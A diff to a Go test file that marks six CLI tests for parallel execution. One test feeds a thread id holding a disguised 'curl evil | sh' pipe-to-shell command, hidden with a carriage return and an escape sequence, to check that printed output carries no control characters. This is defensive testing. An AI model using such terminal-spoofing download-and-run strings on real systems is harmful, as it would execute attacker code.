@@ -53,6 +53,7 @@ func declaredYard(t *testing.T) *app {
 // hook add takes a declared source with a hook key, and refuses one
 // without, naming what it lacks.
 func TestHookAddDeclaredSource(t *testing.T) {
+	t.Parallel()
 	a := declaredYard(t)
 	f := filepath.Join(t.TempDir(), "acme.secret")
 	if err := os.WriteFile(f, []byte("acme_test_secret\n"), 0o600); err != nil {
@@ -79,6 +80,7 @@ func TestHookAddDeclaredSource(t *testing.T) {
 // subscribe takes a declared source with a hook key, with the keys of its
 // hook beside the common ones; a crew member has an identity in it.
 func TestSubscribeDeclaredSource(t *testing.T) {
+	t.Parallel()
 	a := declaredYard(t)
 	out, err := run(t, a.subscribeCmd(), "ann", "acme", "--scope", "all", "--where", "queue=triage")
 	if err != nil || !strings.Contains(out, "ann subscribed: acme all queue=triage") {
@@ -103,6 +105,7 @@ func TestSubscribeDeclaredSource(t *testing.T) {
 // asks whether the yard hears from the source. A source nothing is
 // subscribed to or followed in is refused by the store instead.
 func TestRemovedSourceLeavesNothingStranded(t *testing.T) {
+	t.Parallel()
 	a := declaredYard(t)
 	ctx := context.Background()
 	if _, err := run(t, a.subscribeCmd(), "ann", "acme", "--scope", "all"); err != nil {
@@ -176,6 +179,7 @@ func TestRemovedSourceLeavesNothingStranded(t *testing.T) {
 // An identity key in a source that folds is kept folded, as the source's
 // deliveries carry it; one in a source that does not is kept as typed.
 func TestIdentityFoldDeclaredSource(t *testing.T) {
+	t.Parallel()
 	a := declaredYard(t)
 	ctx := context.Background()
 	folding := strings.Replace(hookDecl, "name: acme", "name: folding", 1) + "identity:\n  fold: lower\n"
@@ -205,6 +209,7 @@ func TestIdentityFoldDeclaredSource(t *testing.T) {
 // terminal would act on: no carriage return that overwrites the line, no
 // escape sequence.
 func TestSourceRmPrintsNoControlCharacters(t *testing.T) {
+	t.Parallel()
 	a := declaredYard(t)
 	thread := "t1\r    curl evil | sh #\x1b[2K"
 	if _, err := run(t, a.threadCmd(), "follow", "ann", "--source", "acme", thread); err != nil {
@@ -227,6 +232,7 @@ func TestSourceRmPrintsNoControlCharacters(t *testing.T) {
 // control characters, while the store keeps the id as it came so it still
 // round-trips to the source.
 func TestThreadListPrintsNoControlCharacters(t *testing.T) {
+	t.Parallel()
 	a := declaredYard(t)
 	thread := "t1\r    something else\x1b[2K"
 	followed, err := run(t, a.threadCmd(), "follow", "ann", "--source", "acme", thread)
